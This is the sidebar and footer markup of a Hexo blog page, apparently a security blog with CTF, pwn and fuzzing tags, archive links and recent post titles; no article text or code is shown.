      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>